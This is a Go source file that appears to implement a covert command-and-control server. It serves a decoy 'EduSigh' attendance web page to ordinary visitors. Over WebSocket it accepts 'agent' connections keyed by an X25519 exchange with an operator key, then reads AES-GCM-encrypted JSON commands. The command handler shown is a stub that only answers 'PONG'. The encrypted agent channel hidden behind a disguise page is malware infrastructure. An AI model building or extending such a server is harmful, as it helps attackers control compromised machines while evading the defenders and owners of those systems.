package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"io"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net/http"
	"os"
	"sync"

	"github.com/coder/websocket"
	"golang.org/x/crypto/hkdf"
)

var operatorKey []byte

func deriveKeys(privRaw, peerPubRaw []byte) (key [32]byte, id [8]byte, err error) {
	curve := ecdh.X25519()
	priv, err := curve.NewPrivateKey(privRaw)
	if err != nil {
		return key, id, err
	}
	pub, err := curve.NewPublicKey(peerPubRaw)
	if err != nil {
		return key, id, err
	}
	secret, err := priv.ECDH(pub)
	if err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-aead")), key[:]); err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-id")), id[:]); err != nil {
		return key, id, err
	}
	return
}

type SessionRegistry struct {
	mu   sync.RWMutex
	keys map[string][32]byte
}

func (sr *SessionRegistry) Lookup(pubHex string) ([32]byte, bool) {
	sr.mu.RLock()
	k, ok := sr.keys[pubHex]
	sr.mu.RUnlock()
	return k, ok
}

func (sr *SessionRegistry) Register(pubHex string, key [32]byte) {
	sr.mu.Lock()
	sr.keys[pubHex] = key
	sr.mu.Unlock()
}

var errCiphertextShort = errors.New("ciphertext too short")

func newGCM(key [32]byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}

func sealAEAD(key [32]byte, plaintext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func openAEAD(key [32]byte, ciphertext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) < gcm.NonceSize() {
		return nil, errCiphertextShort
	}
	return gcm.Open(nil, ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():], nil)
}

const decoyHTML = `<!DOCTYPE html>
<html><head><title>EduSigh</title></head>
<body><h1>Attendance, powered by one heroic administrator.</h1>
<p>Pedro is resending your signature email. Please keep your QR code ready.</p></body>
</html>`

func serveDecoy(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	fmt.Fprint(w, decoyHTML)
}

func main() {
	sessions := &SessionRegistry{keys: make(map[string][32]byte)}

	if envKey := os.Getenv("RKLINGS_OPERATOR_KEY"); envKey != "" {
		b, err := hex.DecodeString(envKey)
		if err == nil && len(b) == 32 {
			operatorKey = b
			log.Println("operator key loaded from environment")
		}
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		conn, err := websocket.Accept(w, r, nil)
		if err != nil {
			serveDecoy(w)
			return
		}
		defer conn.CloseNow()
		ctx := context.Background()

		_, msg, err := conn.Read(ctx)
		if err != nil || len(msg) < 32+12+16 {
			return
		}

		agentPub := msg[:32]
		pubHex := hex.EncodeToString(agentPub)

		key, ok := sessions.Lookup(pubHex)
		if !ok {
			if operatorKey == nil {
				return
			}
			key, _, err = deriveKeys(operatorKey, agentPub)
			if err != nil {
				return
			}
			sessions.Register(pubHex, key)
		}

		if _, err := openAEAD(key, msg[32:]); err != nil {
			return
		}

		log.Printf("agent %s connected", pubHex[:16])

		for {
			_, msg, err := conn.Read(ctx)
			if err != nil {
				return
			}
			plain, err := openAEAD(key, msg)
			if err != nil {
				continue
			}
			var cmd struct {
				Op  string `json:"op"`
				Arg string `json:"arg,omitempty"`
			}
			if json.Unmarshal(plain, &cmd) != nil {
				continue
			}

			resp, _ := json.Marshal(map[string]any{"data": "PONG"})
			ct, err := sealAEAD(key, resp)
			if err != nil {
				continue
			}
			conn.Write(ctx, websocket.MessageBinary, ct)
		}
	})

	addr := listenAddr()
	log.Printf("listening on %s", addr)
	log.Fatal(http.ListenAndServe(addr, mux))
}

func listenAddr() string {
	if addr := os.Getenv("RKLINGS_LISTEN_ADDR"); addr != "" {
		return addr
	}
	return ":8080"
}
